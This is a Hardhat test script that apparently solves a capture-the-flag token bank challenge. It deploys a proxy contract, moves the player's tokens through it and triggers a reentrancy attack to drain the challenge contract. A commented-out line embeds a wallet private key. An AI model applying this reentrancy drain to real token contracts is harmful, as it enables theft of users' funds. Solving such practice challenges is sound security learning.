import { ethers } from "hardhat";
import { expect } from "chai";

describe("tokenbank", function() {
    it("should solve token bank challenge", async function() {
        this.timeout(0);

        let accounts = await ethers.getSigners();
        let eoa = accounts[0];
        let ethBalance = await eoa.getBalance();
        console.log(ethers.utils.formatEther(ethBalance));

        const targetAddr = "0xca201550EC09d1D9A8B96A586b34098c1Be4dd58";
        const targetFactory = await ethers.getContractFactory("TokenBankChallenge");
        let targetCont = targetFactory.attach(targetAddr);

        // for local testnet
        // let localeoa = new ethers.Wallet("0xb23e37b58a78b8cb1253068c25646804da0ba0d2d7fff3b8b8412874a18ebec7", eoa.provider);
        // targetCont = targetCont.connect(localeoa);
        // let initialTokenBalance = await targetCont.balanceOf(localeoa.address);

        let initialTokenBalance = await targetCont.balanceOf(eoa.address);

        console.log(initialTokenBalance.toString());

        const tokenAddr = await targetCont.token();
        const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
        let tokenCont = tokenFactory.attach(tokenAddr);

        // for local testnet
        // tokenCont = tokenCont.connect(localeoa);

        const proxyFactory = await ethers.getContractFactory("TokenBankProxy");
        let proxyCont = await proxyFactory.deploy(targetCont.address);
        
        // for local testnet
        // proxyCont = proxyCont.connect(localeoa);

        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash);
        console.log("Proxy Cont deployed");

        // transfer tokens to proxy contract
        let tx = await targetCont.withdraw(initialTokenBalance);
        await tx.wait();
        console.log(tx);

        /* transfer(address,uint256) should be written withouth any spaces
         * in this inline call function with signature syntax.  
        */ 
        tx = await tokenCont['transfer(address,uint256)'](proxyCont.address, initialTokenBalance);
        await tx.wait(tx);
        console.log(tx);

        tx = await proxyCont.deposit();
        await tx.wait(tx);
        console.log(tx);

        // check proxy cont balance
        const proxyBalance = await targetCont.balanceOf(proxyCont.address);
        expect(proxyBalance).to.eq(initialTokenBalance);

        // start reentrancy
        tx = await proxyCont.trigger_attack();
        await tx.wait();

        // check done
        const isComplete = await targetCont.isComplete();
        expect(isComplete).to.be.true;
    });
});